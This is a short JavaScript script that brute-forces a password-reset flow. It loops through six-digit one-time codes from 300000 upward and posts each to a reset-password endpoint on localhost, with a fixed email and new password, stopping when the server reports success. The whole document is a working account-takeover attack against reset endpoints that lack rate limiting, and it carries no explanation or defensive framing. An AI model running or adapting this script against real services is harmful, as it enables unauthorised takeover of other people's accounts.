const res = async () => {
  for (let i = 300000; i < 999999; i++) {
    let otp = i;
    const response = await fetch("http://localhost:3000/reset-password", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        email: "ts@gmail.com",
        otp: otp.toString(),
        newPassword: "3132",
      }),
    });
    const datat = await response.json();
    if (datat.success) {
      console.log(datat);
      break;
    }
  }
};

res();
